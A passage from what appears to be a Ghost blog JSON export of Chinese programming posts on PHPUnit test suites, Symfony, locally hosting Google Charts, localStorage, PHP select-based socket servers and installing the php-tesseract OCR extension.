\\n这样，只需要执行一句: *phpunit suit.php* 即可完成所有测试套件中的测试了，大功告成。\\n    \\n![Martin Fowler](/content/images/2013/Dec/0D336CBB8432C3D6138A72620A532640_B500_900_200_248_JPEG.jpeg)\\n\\n* From 马大叔的个人博客\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><!--kg-card-begin: markdown--><blockquote>\n<p>Whenever you are tempted to type something into a print statement or a debugger expression, write it as a test instead.<br>\n<span style=\"float:right\">--Martin Fowler<span></p>\n</blockquote>\n<p>正确的测试代码可以很大程度的保证生产代码的可靠性，TDD规范要求开发者在编写生产代码之前先为其接口编写测试。这样可以保证在产品需求不变的前提下稳步推进开发进程，避免潜在BUG，同时也不必担心在改代码的过程中影响该代码其他的调用者。有测试代码为你保驾护航那么就请大胆的重构吧，TDD保证你的代码整天干爽。从此，我们终于告别坑爹的队员，告别客户的夺命连环call，程序员们可以睡个好觉了。所以还有什么理由向这样可爱的开发方式说不呢，现在就开始吧。</p>\n<p>PHP最知名的测试框架PHPUnit完整的复制了JUnit3的实现方式,如果你了解JUnit,那基本可以直接上手了.<br>\n<img src=\"/content/images/2013/Dec/2ED747AB92F610AC407F10B6D0AB0BCB_B500_900_500_133_PNG.png\" alt=\"PHPUnit\"></p>\n<p>代码顺利通过测试了，不过当测试代码越来越多以后，要挨个执行测试还是比较麻烦的，别担心，phpunit提供了测试套件帮助你完美解决这个问题。以下是一个简单测试套件的例子：</p>\n<pre><code>/**                  \n* 我的测试套件\n*/\nclass suite extends PHPUnit2_Framework_TestSuite {\n                       \n\tpublic function __construct(){\n \t   $testFiles = array(\n  \t      'IndexTest.php', //首页\n  \t      'UserTest.php', //用户管理\n  \t   );  \n   \t   $this-&gt;addTestFiles( $testFiles );\n\t}   \n                       \n\tpublic static function suite() {\n \t   //最后一定得返回PHPUnit_Framework_TestSuite对像\n  \t  return new self();\n\t}   \n}\n</code></pre>\n<p>这样，只需要执行一句: <em>phpunit suit.php</em> 即可完成所有测试套件中的测试了，大功告成。</p>\n<p><img src=\"/content/images/2013/Dec/0D336CBB8432C3D6138A72620A532640_B500_900_200_248_JPEG.jpeg\" alt=\"Martin Fowler\"></p>\n<ul>\n<li>From 马大叔的个人博客</li>\n</ul>\n<!--kg-card-end: markdown--><!--kg-card-end: markdown-->","comment_id":"8","plaintext":"> Whenever you are tempted to type something into a print statement or a debugger\nexpression, write it as a test instead.\n--Martin Fowler\n\n\n正确的测试代码可以很大程度的保证生产代码的可靠性，TDD规范要求开发者在编写生产代码之前先为其接口编写测试。这样可以保证在产品需求不变的前提下稳步推进开发进程，避免潜在BUG，同时也不必担心在改代码的过程中影响该代码其他的调用者。有测试代码为你保驾护航那么就请大胆的重构吧，TDD保证你的代码整天干爽。从此，我们终于告别坑爹的队员，告别客户的夺命连环call，程序员们可以睡个好觉了。所以还有什么理由向这样可爱的开发方式说不呢，现在就开始吧。\n\nPHP最知名的测试框架PHPUnit完整的复制了JUnit3的实现方式,如果你了解JUnit,那基本可以直接上手了.\n\n\n代码顺利通过测试了，不过当测试代码越来越多以后，要挨个执行测试还是比较麻烦的，别担心，phpunit提供了测试套件帮助你完美解决这个问题。以下是一个简单测试套件的例子：\n\n/**                  \n* 我的测试套件\n*/\nclass suite extends PHPUnit2_Framework_TestSuite {\n                       \n\tpublic function __construct(){\n \t   $testFiles = array(\n  \t      'IndexTest.php', //首页\n  \t      'UserTest.php', //用户管理\n  \t   );  \n   \t   $this->addTestFiles( $testFiles );\n\t}   \n                       \n\tpublic static function suite() {\n \t   //最后一定得返回PHPUnit_Framework_TestSuite对像\n  \t  return new self();\n\t}   \n}\n\n\n这样，只需要执行一句: phpunit suit.php  即可完成所有测试套件中的测试了，大功告成。\n\n\n\n * From 马大叔的个人博客","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2013-12-19 03:26:42","updated_at":"2016-02-12 07:31:25","published_at":"2013-01-30 04:00:00","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null,"canonical_url":null},{"id":"5cfa089b31767300013e0e5c","uuid":"ab2c0856-736f-4fbe-b199-28c223e2e465","title":"Symfony PHP Framework","slug":"symfony-php-framework","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\n\\tSymfony是一个很优秀的PHP开发框架,其大量参考了 J2EE 的架构模式(和Spring十分类似),非常适合大型项目的开发.什么,你了解J2EE?那么恭喜你,你已经成功了一半!\\n    \\n**优势:**\\n\\t\\n* 强大的命令行脚手架工具(也有GUI工具),协助你快速完成大量的初期项目搭建工作.\\n* Java bean式的依赖注入管理,向高耦合说再见.\\n* 完全自定义的路由管理,支持配置文件或者注释配置的方式.\\n* 完全模块化的设计,如果你愿意,框架的各个部分都可以换成你喜欢的库.\\n* 模板文件对布局,继承有良好的支持,据说用起来相当不错.\\n* 非常齐全的手册,Cookbook 等 统统都是免费的 ...\\n\\n有兴趣? 那么现在就开始吧: \\n[Symfony Get Started](http://symfony.com/doc/current/quick_tour/the_big_picture.html)\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><!--kg-card-begin: markdown--><pre><code>Symfony是一个很优秀的PHP开发框架,其大量参考了 J2EE 的架构模式(和Spring十分类似),非常适合大型项目的开发.什么,你了解J2EE?那么恭喜你,你已经成功了一半!\n</code></pre>\n<p><strong>优势:</strong></p>\n<ul>\n<li>强大的命令行脚手架工具(也有GUI工具),协助你快速完成大量的初期项目搭建工作.</li>\n<li>Java bean式的依赖注入管理,向高耦合说再见.</li>\n<li>完全自定义的路由管理,支持配置文件或者注释配置的方式.</li>\n<li>完全模块化的设计,如果你愿意,框架的各个部分都可以换成你喜欢的库.</li>\n<li>模板文件对布局,继承有良好的支持,据说用起来相当不错.</li>\n<li>非常齐全的手册,Cookbook 等 统统都是免费的 ...</li>\n</ul>\n<p>有兴趣? 那么现在就开始吧:<br>\n<a href=\"http://symfony.com/doc/current/quick_tour/the_big_picture.html\">Symfony Get Started</a></p>\n<!--kg-card-end: markdown--><!--kg-card-end: markdown-->","comment_id":"9","plaintext":"Symfony是一个很优秀的PHP开发框架,其大量参考了 J2EE 的架构模式(和Spring十分类似),非常适合大型项目的开发.什么,你了解J2EE?那么恭喜你,你已经成功了一半!\n\n\n优势:\n\n * 强大的命令行脚手架工具(也有GUI工具),协助你快速完成大量的初期项目搭建工作.\n * Java bean式的依赖注入管理,向高耦合说再见.\n * 完全自定义的路由管理,支持配置文件或者注释配置的方式.\n * 完全模块化的设计,如果你愿意,框架的各个部分都可以换成你喜欢的库.\n * 模板文件对布局,继承有良好的支持,据说用起来相当不错.\n * 非常齐全的手册,Cookbook 等 统统都是免费的 ...\n\n有兴趣? 那么现在就开始吧:\nSymfony Get Started\n[http://symfony.com/doc/current/quick_tour/the_big_picture.html]","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2013-12-19 03:47:55","updated_at":"2015-04-04 02:14:57","published_at":"2013-05-01 04:00:00","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null,"canonical_url":null},{"id":"5cfa089b31767300013e0e5d","uuid":"b70e913b-3bc9-44b9-af5e-721c497c7eb3","title":"google Charts 本地化部署","slug":"google-charts-ben-di-hua-bu-shu","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"之前做过一个数据分析工具，需求之一是要根据统计出的数据生成图表，考虑了Raphael，Bootstrap Chart.js 和google Charts 三个JS库，最终选定google Charts，原因是Raphel学习成本太高而Bootsrap Chart.js的功能上明显无法满足需求.google Charts部署的方式很简单.\\n\\n\\t<script type=\\\"text/javascript\\\" src=\\\"https://www.google.com/jsapi\\\"></script>\\n    \\n问题来了,google Charts需要通过访问google API导入依赖,但是国内访问谷歌服务器稳定性不敢恭维，于是决定把google Charts直接部署到本地。\\nGoogle没有提供直接部署在本地的方案，不过毕竟是JS，可以直接从浏览器中获取。不过需要稍微研究了一下google Charts加载依赖的工作方式。\\n\\n打开控制台，发现Google Charts首先加载了一个叫googleapi.js的文件 :\\n![chrome console](/content/images/2013/Dec/E344CB5E48CAC1951876995D5DF5C10D_B500_900_500_151_PNG.png)\\ngoogleapi.js根据生产代码中需要载入的库，去请求google服务器上对应的库到本地。\\n原理看清楚了，直接把googleapi下载到本地，从本地引入，修改代码中服务器配置部分的代码，将服务器配置换成本机地址。\\n\\t\\n    if (!window['google']['loader']) {\\n    window['google']['loader'] = {};\\n    google.loader.ServiceBase = 'https://www.google.com/uds';\\n    google.loader.GoogleApisBase = 'https://ajax.googleapis.com/ajax';\\n    google.loader.ApiKey = 'notsupplied';\\n    google.loader.KeyVerified = true;\\n    google.loader.LoadFailure = false;\\n    google.loader.Secure = true;\\n    google.loader.GoogleLocale = 'www.google.com';\\n    google.loader.ClientLocation = null;\\n    google.loader.AdditionalParams = '';\\n   \\n在文件最后添加载入google charts库的代码，并在html中引入本地的googleapi.js文件:\\n\\t\\n    <script src=\\\"__JS__/google/jsapi.js\\\"></script>\\n    \\n大功告成，现在不需要从google服务器请求js文件了，飞一般的速度!\\n\\n![](/content/images/2013/Dec/5C263310DABDA06DE09D9D1F93D0BA18_B500_900_417_94_PNG.png)\\n\\nMysql数据分析工具 演示站 ： http://mysqldata.chxj.name\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><!--kg-card-begin: markdown--><p>之前做过一个数据分析工具，需求之一是要根据统计出的数据生成图表，考虑了Raphael，Bootstrap Chart.js 和google Charts 三个JS库，最终选定google Charts，原因是Raphel学习成本太高而Bootsrap Chart.js的功能上明显无法满足需求.google Charts部署的方式很简单.</p>\n<pre><code>&lt;script type=&quot;text/javascript&quot; src=&quot;https://www.google.com/jsapi&quot;&gt;&lt;/script&gt;\n</code></pre>\n<p>问题来了,google Charts需要通过访问google API导入依赖,但是国内访问谷歌服务器稳定性不敢恭维，于是决定把google Charts直接部署到本地。<br>\nGoogle没有提供直接部署在本地的方案，不过毕竟是JS，可以直接从浏览器中获取。不过需要稍微研究了一下google Charts加载依赖的工作方式。</p>\n<p>打开控制台，发现Google Charts首先加载了一个叫googleapi.js的文件 :<br>\n<img src=\"/content/images/2013/Dec/E344CB5E48CAC1951876995D5DF5C10D_B500_900_500_151_PNG.png\" alt=\"chrome console\"><br>\ngoogleapi.js根据生产代码中需要载入的库，去请求google服务器上对应的库到本地。<br>\n原理看清楚了，直接把googleapi下载到本地，从本地引入，修改代码中服务器配置部分的代码，将服务器配置换成本机地址。</p>\n<pre><code>if (!window['google']['loader']) {\nwindow['google']['loader'] = {};\ngoogle.loader.ServiceBase = 'https://www.google.com/uds';\ngoogle.loader.GoogleApisBase = 'https://ajax.googleapis.com/ajax';\ngoogle.loader.ApiKey = 'notsupplied';\ngoogle.loader.KeyVerified = true;\ngoogle.loader.LoadFailure = false;\ngoogle.loader.Secure = true;\ngoogle.loader.GoogleLocale = 'www.google.com';\ngoogle.loader.ClientLocation = null;\ngoogle.loader.AdditionalParams = '';\n</code></pre>\n<p>在文件最后添加载入google charts库的代码，并在html中引入本地的googleapi.js文件:</p>\n<pre><code>&lt;script src=&quot;__JS__/google/jsapi.js&quot;&gt;&lt;/script&gt;\n</code></pre>\n<p>大功告成，现在不需要从google服务器请求js文件了，飞一般的速度!</p>\n<p><img src=\"/content/images/2013/Dec/5C263310DABDA06DE09D9D1F93D0BA18_B500_900_417_94_PNG.png\" alt=\"\"></p>\n<p>Mysql数据分析工具 演示站 ： <a href=\"http://mysqldata.chxj.name\">http://mysqldata.chxj.name</a></p>\n<!--kg-card-end: markdown--><!--kg-card-end: markdown-->","comment_id":"10","plaintext":"之前做过一个数据分析工具，需求之一是要根据统计出的数据生成图表，考虑了Raphael，Bootstrap Chart.js 和google Charts\n三个JS库，最终选定google Charts，原因是Raphel学习成本太高而Bootsrap Chart.js的功能上明显无法满足需求.google\nCharts部署的方式很简单.\n\n<script type=\"text/javascript\" src=\"https://www.google.com/jsapi\"></script>\n\n\n问题来了,google Charts需要通过访问google API导入依赖,但是国内访问谷歌服务器稳定性不敢恭维，于是决定把google\nCharts直接部署到本地。\nGoogle没有提供直接部署在本地的方案，不过毕竟是JS，可以直接从浏览器中获取。不过需要稍微研究了一下google Charts加载依赖的工作方式。\n\n打开控制台，发现Google Charts首先加载了一个叫googleapi.js的文件 :\n\ngoogleapi.js根据生产代码中需要载入的库，去请求google服务器上对应的库到本地。\n原理看清楚了，直接把googleapi下载到本地，从本地引入，修改代码中服务器配置部分的代码，将服务器配置换成本机地址。\n\nif (!window['google']['loader']) {\nwindow['google']['loader'] = {};\ngoogle.loader.ServiceBase = 'https://www.google.com/uds';\ngoogle.loader.GoogleApisBase = 'https://ajax.googleapis.com/ajax';\ngoogle.loader.ApiKey = 'notsupplied';\ngoogle.loader.KeyVerified = true;\ngoogle.loader.LoadFailure = false;\ngoogle.loader.Secure = true;\ngoogle.loader.GoogleLocale = 'www.google.com';\ngoogle.loader.ClientLocation = null;\ngoogle.loader.AdditionalParams = '';\n\n\n在文件最后添加载入google charts库的代码，并在html中引入本地的googleapi.js文件:\n\n<script src=\"__JS__/google/jsapi.js\"></script>\n\n\n大功告成，现在不需要从google服务器请求js文件了，飞一般的速度!\n\n\n\nMysql数据分析工具 演示站 ： http://mysqldata.chxj.name","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2013-12-19 04:11:53","updated_at":"2015-04-04 02:14:07","published_at":"2013-03-16 04:00:00","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null,"canonical_url":null},{"id":"5cfa089b31767300013e0e5e","uuid":"099c3af2-f429-44b2-8bd2-9d8399374ddf","title":"使用 localStorage 储存本地数据","slug":"shi-yong-localstorage-chu-cun-ben-di-shu-ju","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\" 做数据分析工具的时有一些数据需要存在本地，如在处理数据的过程中，需要把每一步的条件保存起来以便可以进行撤销操作。\\n\\n 通常，数据库和COOKIE是比较常见的储存数据的方式。不过，COOKIE只能保存4k的大小并且把大量垃圾数据加在报头里也不太好。而这种临时有效的数据也不太适合保存在数据库中。和存在数据库中相比，这类数据更适合保存在客户端，浏览器的localStorage正好可以用来完成这项任务。\\n\\n localStorage对象提供了数据操作的基本方法，最常用的：setItem(), getItem(), removeItem(), clear()。借助这四个方法可以简单的完成对localStorage的操作。\\n\\n保存数据到localStorage中：\\n\\t\\n    var sql = $(\\\"#sql\\\").val();\\n\\tlocalStorage.setItem('sql'+key,[sql]);\\n    \\n读取，删除localStorage的数据：\\n\\n\\tvar sql = localStorage.getItem('sql'+key);  \\n\\tlocalStorage.removeItem('sql'+key);\\n\\nclear() 方法则会清除localStorage中的全部数据。\\n\\nlocalStorage在客户端提供了一个简单的本地存储，使很多临时性的数据都可以在前端保存，为Web开发带来了极大的便利。\\n\\n![LocalStorage](/content/images/2013/Dec/3BA29C6C6BC3676EAE0296EEE98CD195_B500_900_500_116_PNG.png)\\n\\nMysql数据分析工具 演示站: http://mysqldata.chxj.name\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><!--kg-card-begin: markdown--><p>做数据分析工具的时有一些数据需要存在本地，如在处理数据的过程中，需要把每一步的条件保存起来以便可以进行撤销操作。</p>\n<p>通常，数据库和COOKIE是比较常见的储存数据的方式。不过，COOKIE只能保存4k的大小并且把大量垃圾数据加在报头里也不太好。而这种临时有效的数据也不太适合保存在数据库中。和存在数据库中相比，这类数据更适合保存在客户端，浏览器的localStorage正好可以用来完成这项任务。</p>\n<p>localStorage对象提供了数据操作的基本方法，最常用的：setItem(), getItem(), removeItem(), clear()。借助这四个方法可以简单的完成对localStorage的操作。</p>\n<p>保存数据到localStorage中：</p>\n<pre><code>var sql = $(&quot;#sql&quot;).val();\nlocalStorage.setItem('sql'+key,[sql]);\n</code></pre>\n<p>读取，删除localStorage的数据：</p>\n<pre><code>var sql = localStorage.getItem('sql'+key);  \nlocalStorage.removeItem('sql'+key);\n</code></pre>\n<p>clear() 方法则会清除localStorage中的全部数据。</p>\n<p>localStorage在客户端提供了一个简单的本地存储，使很多临时性的数据都可以在前端保存，为Web开发带来了极大的便利。</p>\n<p><img src=\"/content/images/2013/Dec/3BA29C6C6BC3676EAE0296EEE98CD195_B500_900_500_116_PNG.png\" alt=\"LocalStorage\"></p>\n<p>Mysql数据分析工具 演示站: <a href=\"http://mysqldata.chxj.name\">http://mysqldata.chxj.name</a></p>\n<!--kg-card-end: markdown--><!--kg-card-end: markdown-->","comment_id":"11","plaintext":"做数据分析工具的时有一些数据需要存在本地，如在处理数据的过程中，需要把每一步的条件保存起来以便可以进行撤销操作。\n\n通常，数据库和COOKIE是比较常见的储存数据的方式。不过，COOKIE只能保存4k的大小并且把大量垃圾数据加在报头里也不太好。而这种临时有效的数据也不太适合保存在数据库中。和存在数据库中相比，这类数据更适合保存在客户端，浏览器的localStorage正好可以用来完成这项任务。\n\nlocalStorage对象提供了数据操作的基本方法，最常用的：setItem(), getItem(), removeItem(),\nclear()。借助这四个方法可以简单的完成对localStorage的操作。\n\n保存数据到localStorage中：\n\nvar sql = $(\"#sql\").val();\nlocalStorage.setItem('sql'+key,[sql]);\n\n\n读取，删除localStorage的数据：\n\nvar sql = localStorage.getItem('sql'+key);  \nlocalStorage.removeItem('sql'+key);\n\n\nclear() 方法则会清除localStorage中的全部数据。\n\nlocalStorage在客户端提供了一个简单的本地存储，使很多临时性的数据都可以在前端保存，为Web开发带来了极大的便利。\n\n\n\nMysql数据分析工具 演示站: http://mysqldata.chxj.name","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2013-12-19 04:17:00","updated_at":"2015-04-04 02:14:28","published_at":"2013-03-25 04:00:00","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null,"canonical_url":null},{"id":"5cfa089b31767300013e0e5f","uuid":"2bd1aee9-129f-497f-b3cb-a3a2580e1e8b","title":"PHP socket 编程: select同步非阻塞多路复用模式","slug":"php-socket-bian-cheng-selecttong-bu-fei-zu-sai-duo-lu-fu-yong-mo-shi","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"听了凌总培训的socket之后，认识到socket编程虽然平时应用的不多（特别是PHP的socket编程，基本上没什么应用），但确实是非常重要的一块知识，我等泥腿子程序员务必要好好学习，千万不可舍本逐末、急功近利，捡了芝麻丢西瓜$_$。。。\\n\\n因为在socket编程方面没什么基础，所以只是简单的看了一下PHP的socket,加深对socket的认识。PHP socket是基于BSD的socket接口实现的，所以如果想更深入的学习可以直接研究一下UNIX编程，这里不再赘述。\\n\\nphp作为一个效率一般的单线程语言，用来做socket服务器确实有点勉强，不过php还是提供了各种相关函数，使其可以完整地实现socket编程的各项功能。\\n\\t\\n\\t// Create a new socket                   \\n\\t$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);                                     \\n\\t$server['host'] = '127.0.0.1';           \\n\\t$server['port'] = '2013';            \\n\\tsocket_bind($socket,$server['host'],$server['port']);\\n    socket_listen($socket);\\n\\t...\\n    \\n首先需要生成一个服务器端socket，并绑定到某主机、端口。注意，一定要将该socket设为非阻塞的。否则socket在accept等待新连接时程序将会被阻塞.\\n\\n\\tsocket_set_nonblock($socket);\\n\\n一个socket服务端必然需要同时为多个客户端提供服务，单线程的php 的socket模块提供了select的多路复用模型来解决这一问题。\\n\\n\\t//复制一份客户端列表,socket_select函数的引用参数 \\n\\t$read = $this->clients;                \\n\\twhile ( @socket_select($read, $write = NULL, $except = NULL,2) < $this->maxClient ) {            \\n    //从连接池中选取一个socket资源   \\n    $newc = $this->selectClient( $read,$socket );   \\n    if ( $newc === false )     \\n         break ;                                                  \\n\\t ...\\n     \\n当程序发现有一个新的客户端socket连接服务端时，就将该socket加入select的连接池，等待服务端提供服务，需要注意，加入的客户端socket也需要设为非阻塞，否则客户端在等待服务端读取其缓冲区中的数据时也会将线程阻塞。\\n\\n当客户端发出退出信号时，服务端将该客户端socket从连接池中去除，socket连接断开。\\n\\n完成编程后，可用telnet作为客户端对该服务端进行测试。\\n\\n![php socket](/content/images/2013/Dec/A66F9F28A5A2EBBFD47FEA47738D3645_B500_900_500_199_PNG.png)\\n\\n* 另外，依靠PHP 的 libevent 扩展（需配置安装），也可以实现 epoll/kqueue 的异步非阻塞I/O模型，性能上会表现的更加优秀。\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><!--kg-card-begin: markdown--><p>听了凌总培训的socket之后，认识到socket编程虽然平时应用的不多（特别是PHP的socket编程，基本上没什么应用），但确实是非常重要的一块知识，我等泥腿子程序员务必要好好学习，千万不可舍本逐末、急功近利，捡了芝麻丢西瓜$_$。。。</p>\n<p>因为在socket编程方面没什么基础，所以只是简单的看了一下PHP的socket,加深对socket的认识。PHP socket是基于BSD的socket接口实现的，所以如果想更深入的学习可以直接研究一下UNIX编程，这里不再赘述。</p>\n<p>php作为一个效率一般的单线程语言，用来做socket服务器确实有点勉强，不过php还是提供了各种相关函数，使其可以完整地实现socket编程的各项功能。</p>\n<pre><code>// Create a new socket                   \n$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);                                     \n$server['host'] = '127.0.0.1';           \n$server['port'] = '2013';            \nsocket_bind($socket,$server['host'],$server['port']);\nsocket_listen($socket);\n...\n</code></pre>\n<p>首先需要生成一个服务器端socket，并绑定到某主机、端口。注意，一定要将该socket设为非阻塞的。否则socket在accept等待新连接时程序将会被阻塞.</p>\n<pre><code>socket_set_nonblock($socket);\n</code></pre>\n<p>一个socket服务端必然需要同时为多个客户端提供服务，单线程的php 的socket模块提供了select的多路复用模型来解决这一问题。</p>\n<pre><code>//复制一份客户端列表,socket_select函数的引用参数 \n$read = $this-&gt;clients;                \nwhile ( @socket_select($read, $write = NULL, $except = NULL,2) &lt; $this-&gt;maxClient ) {            \n//从连接池中选取一个socket资源   \n$newc = $this-&gt;selectClient( $read,$socket );   \nif ( $newc === false )     \n     break ;                                                  \n ...\n</code></pre>\n<p>当程序发现有一个新的客户端socket连接服务端时，就将该socket加入select的连接池，等待服务端提供服务，需要注意，加入的客户端socket也需要设为非阻塞，否则客户端在等待服务端读取其缓冲区中的数据时也会将线程阻塞。</p>\n<p>当客户端发出退出信号时，服务端将该客户端socket从连接池中去除，socket连接断开。</p>\n<p>完成编程后，可用telnet作为客户端对该服务端进行测试。</p>\n<p><img src=\"/content/images/2013/Dec/A66F9F28A5A2EBBFD47FEA47738D3645_B500_900_500_199_PNG.png\" alt=\"php socket\"></p>\n<ul>\n<li>另外，依靠PHP 的 libevent 扩展（需配置安装），也可以实现 epoll/kqueue 的异步非阻塞I/O模型，性能上会表现的更加优秀。</li>\n</ul>\n<!--kg-card-end: markdown--><!--kg-card-end: markdown-->","comment_id":"12","plaintext":"听了凌总培训的socket之后，认识到socket编程虽然平时应用的不多（特别是PHP的socket编程，基本上没什么应用），但确实是非常重要的一块知识，我等泥腿子程序员务必要好好学习，千万不可舍本逐末、急功近利，捡了芝麻丢西瓜$_$。。。\n\n因为在socket编程方面没什么基础，所以只是简单的看了一下PHP的socket,加深对socket的认识。PHP\nsocket是基于BSD的socket接口实现的，所以如果想更深入的学习可以直接研究一下UNIX编程，这里不再赘述。\n\nphp作为一个效率一般的单线程语言，用来做socket服务器确实有点勉强，不过php还是提供了各种相关函数，使其可以完整地实现socket编程的各项功能。\n\n// Create a new socket                   \n$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);                                     \n$server['host'] = '127.0.0.1';           \n$server['port'] = '2013';            \nsocket_bind($socket,$server['host'],$server['port']);\nsocket_listen($socket);\n...\n\n\n首先需要生成一个服务器端socket，并绑定到某主机、端口。注意，一定要将该socket设为非阻塞的。否则socket在accept等待新连接时程序将会被阻塞.\n\nsocket_set_nonblock($socket);\n\n\n一个socket服务端必然需要同时为多个客户端提供服务，单线程的php 的socket模块提供了select的多路复用模型来解决这一问题。\n\n//复制一份客户端列表,socket_select函数的引用参数 \n$read = $this->clients;                \nwhile ( @socket_select($read, $write = NULL, $except = NULL,2) < $this->maxClient ) {            \n//从连接池中选取一个socket资源   \n$newc = $this->selectClient( $read,$socket );   \nif ( $newc === false )     \n     break ;                                                  \n ...\n\n\n当程序发现有一个新的客户端socket连接服务端时，就将该socket加入select的连接池，等待服务端提供服务，需要注意，加入的客户端socket也需要设为非阻塞，否则客户端在等待服务端读取其缓冲区中的数据时也会将线程阻塞。\n\n当客户端发出退出信号时，服务端将该客户端socket从连接池中去除，socket连接断开。\n\n完成编程后，可用telnet作为客户端对该服务端进行测试。\n\n\n\n * 另外，依靠PHP 的 libevent 扩展（需配置安装），也可以实现 epoll/kqueue 的异步非阻塞I/O模型，性能上会表现的更加优秀。","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2013-12-19 04:25:43","updated_at":"2016-02-12 07:31:46","published_at":"2013-06-17 04:00:00","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null,"canonical_url":null},{"id":"5cfa089b31767300013e0e60","uuid":"e5d2bb43-6a0a-4364-9b78-34ed73cae603","title":"PHP图像识别 php-tesseract","slug":"php-tu-xiang-shi-bie-php-tesseract","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"在做一些网络爬虫工具的时候，经常需要把图片信息转化成文本数据（比如电商网站相互之间比价，而价格往往是图片格式）。网上关于PHP图像识别的文章不少，不过质量都不怎么样，好的工具包更是寥寥无几。好不容易找到一个优秀的PHP图片识别扩展，和大家分享一下。\\n\\n**首先安装依赖程序:**\\n\\t\\n    sudo apt-get install python-distutils-extra tesseract-ocr tesseract-ocr-eng libtesseract-dev libleptonica-dev php5-dev swig libcv-dev build-essential subversion\\n    \\n**编译安装 php-tesseract:**\\n\\n\\tsvn checkout http://php-tesseract.googlecode.com/svn/trunk/ php-tesseract\\n\\tcd php-tesseract\\n\\t./configure --prefix=/usr\\n\\tmake\\n\\tsudo make install\\n\\tmake test\\n   \\n 这里有一个官方提供的例子：\\n \\t\\n    wget http://php-tesseract.googlecode.com/files/tesseract.php\\n\\twget http://php-tesseract.googlecode.com/files/eurotext.jpg\\n\\twget http://php-tesseract.googlecode.com/files/test.php\\n\\tphp test.php\\n    \\n开发时，只要把tesseract.php包含到你的代码中就可以使用了。\\n\\n* 官方提示：需要把 php.ini  中  enable_dl 设为 On\\n\\n**Example:**\\n\\t\\n    include 'tesseract.php';\\n\\t$api= new TessBaseAPI;\\n\\t$api->Init(\\\".\\\",\\\"eng\\\",$mode_or_oem=OEM_DEFAULT);\\n\\t$api->SetPageSegMode(PSM_AUTO);\\n  \\n\\t$mImgFile = \\\"eurotext.jpg\\\";\\n\\t$handle=fopen($mImgFile,\\\"rb\\\");\\n\\t$mBuffer=fread($handle,filesize($mImgFile));\\n\\tprint strlen($mBuffer);\\n\\t$result=ProcessPagesBuffer($mBuffer,strlen($mBuffer),$api);\\n\\tprint \\\"result(ProcessPagesBuffer)=\\\";\\n\\tprint $result;\\n\\t$result = ProcessPagesFileStream($mImgFile,$api);\\n\\tprint \\\"result(ProcessPagesFileStream)=\\\";\\n\\tprint $result;\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><!--kg-card-begin: markdown--><p>在做一些网络爬虫工具的时候，经常需要把图片信息转化成文本数据（比如电商网站相互之间比价，而价格往往是图片格式）。网上关于PHP图像识别的文章不少，不过质量都不怎么样，好的工具包更是寥寥无几。好不容易找到一个优秀的PHP图片识别扩展，和大家分享一下。</p>\n<p><strong>首先安装依赖程序:</strong></p>\n<pre><code>sudo apt-get install python-distutils-extra tesseract-ocr tesseract-ocr-eng libtesseract-dev libleptonica-dev php5-dev swig libcv-dev build-essential subversion\n</code></pre>\n<p><strong>编译安装 php-tesseract:</strong></p>\n<pre><code>svn checkout http://php-tesseract.googlecode.com/svn/trunk/ php-tesseract\ncd php-tesseract\n./configure --prefix=/usr\nmake\nsudo make install\nmake test\n</code></pre>\n<p>这里有一个官方提供的例子：</p>\n<pre><code>wget http://php-tesseract.googlecode.com/files/tesseract.php\nwget http://php-tesseract.googlecode.com/files/eurotext.jpg\nwget http://php-tesseract.googlecode.com/files/test.php\nphp test.php\n</code></pre>\n<p>开发时，只要把tesseract.php包含到你的代码中就可以使用了。</p>\n<ul>\n<li>官方提示：需要把 php.ini  中  enable_dl 设为 On</li>\n</ul>\n<p><strong>Example:</strong></p>\n<pre><code>include 'tesseract.php';\n$api= new 